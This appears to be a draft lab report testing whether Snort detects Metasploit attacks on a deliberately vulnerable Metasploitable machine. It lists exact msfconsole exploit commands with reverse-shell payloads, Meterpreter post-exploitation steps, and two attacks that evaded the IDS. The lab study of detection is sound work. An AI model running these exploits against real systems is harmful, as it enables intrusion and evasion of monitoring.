
Is-it-easier-to-fix-the-application-than-to-detect-attacks.md

Draft

# Is it easier to fix the application than to detect attacks?

To research the question I setup the lab of MetaSploit (a penetration testing tool), Metasploitable (a deliberately vulnerable system) and Snort (an Intruder Detection System). 
I used Virtual Box running Metasploitable on a Windows 8 virtual machine (IP address: 192.168.06) and the Metasploit framework on an Ubuntu virtual machine (IP address: 192.168.04), which were both setup with bridged network so they could communicate with each other.

In the Snort configuration file I enabled all the Community rules to give the best chance of detecting an attack.
I also installed Wireshark on the Snort machine, to inspect the traffic and check it was flowing.
I used the nmap command from the Ubuntu machine to test that Snort was creating alerts correctly, specifically:
sudo nmap -sP 192.168.0.6 -disable-arp-ping

With this setup I was able to find three attacks which produced Snort alerts and two attacks which did not, as follows.

The first attack which triggered a Snort alert was against ManageEngine, which is software for managing desktops and mobiles.
To trigger this alert I took the following steps:
Open MetaSploit console with the command sudo msfconsole. In the MetaSploit console enter the commands:
use exploit/windows/http/manageengine_connectionid_write
set payload windows/meterpreter/reverse_tcp
set rhost 192.168.0.6
set rport 8020 
set lhost 192.168.0.4
set lport 443
exploit

This caused Snort to log the following alert:
03/18-14:39:10.347865  [**] [1:1054:14] SERVER-WEBAPP weblogic/tomcat .jsp view source attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 192.168.0.4:46771 -> 192.168.0.6:8020
So it has clearly detected the attack from the Web Application Attack rules.

The second attack which triggered a Snort alert was against SNMP (Simple Network Management Protocol).
This can be created by using the following commands in the MetaSploit console:
use auxiliary/scanner/snmp/snmp_enum
set rhost 192.168.0.6
set rport 8020 
set lhost 192.168.0.4
set lport 443
exploit

This triggered the Snort alerts:
03/18-16:16:13.000689  [**] [1:1411:19] PROTOCOL-SNMP public access udp [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.0.4:43403 -> 192.168.0.6:161
03/18-16:16:13.000689  [**] [1:1417:17] PROTOCOL-SNMP request udp [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.0.4:43403 -> 192.168.0.6:161

So Snort has detected the attack and recorded an Attempted Information Leak.

The third attack which triggered a SNort alert was against the MySQL database service.
This can be created by using the following commands in the MetSploit console:
use exploit/multi/mysql/mysql_udf_payload
set rhost 192.168.0.6
set rport 3306  
set lhost 192.168.0.4
set lport 443
exploit

This triggered the Snort alert:
03/18-14:59:00.631297  [**] [1:1394:17] INDICATOR-SHELLCODE x86 inc ecx NOOP [**] [Classification: Executable Code was Detected] [Priority: 1] {TCP} 192.168.0.4:40659 -> 192.168.0.6:3306
So Snort has detected the attack and recorded an Executable Code was Detected alert.

I was also able to evade Snort with two attacks.

The first was against Elasticsearch, which is a full-text search engine with a HTTP we interface.
This can be created by using the following commands in the MetSploit console:
use exploit/multi/elasticsearch/script_mvel_rce
set rhost 192.168.0.6
set rport 9200 
set lhost 192.168.0.4
set lport 443
exploit

This copies a JAR file onto the victim computer and executes it, connecting back to MetaSploit to create a shell. 
This is the Meterpreter console and was able to issue various commands, such as:
> upload /temp/trojan.exe c:\\
Copy an executable to the victim computer (not a real trojan, just an empty file).
> shell
Open a shell on the victim computer, followed by the command
> msg vagrant "Hello"
Pop up a message on the vagrant users screen.

No Snort alerts were triggered.

The second attack which evaded Snort was against Ruby on Rails. Which is a wbe application framework.
This can be created by using the following commands in the MetSploit console:
use exploit/multi/http/rails_web_console_v2_code_exec
set rhost 192.168.0.6
set rport 3000 
set lhost 192.168.0.4
set lport 443
exploit

I was then able to run the command:
> msg vagrant "Hello"
To pop up a message on the vagrant users screen.

No Snort alerts were triggered.

Though this shell seemed to be restricted as I was unable to get out of the directory C:\Program Files\Rails_Server
all running the command dir did then produce alert:
03/18-15:16:46.820336  [**] [1:1292:12] INDICATOR-COMPROMISE directory listing [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 192.168.0.6:1502 -> 192.168.0.4:443
Though it is only of "Potentially Bad Traffic".

In conclusion I would say that the answer to the question "Is it easier to fix the application than to detect attacks?" is yes. I was able to evade an intruder detection system with two attacks, using widely available tools, so a more experience attacker would be bale to do this as well. 

A vulnerability in a application can be fixed by just patching it. The fix will be specific to the application and An application like ElasticSearch should never allow Remote Code Execution. Fixing tHis is a simpler problem than trying to detect an intruder, the results of this cannot be  guaranteed to be effective one hundred percent of th time as an attacker can use advanced  techniques such as fragmentation and obfuscation.

Overall I found Snort to detect quite a lot of the attack, but with the sensitivity turned up high there could be a lot of false positives which would increase the chance of the alerts being not taken ignored. I do think that an IDS could still be useful though as part of a defence in depth approach.


References

https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities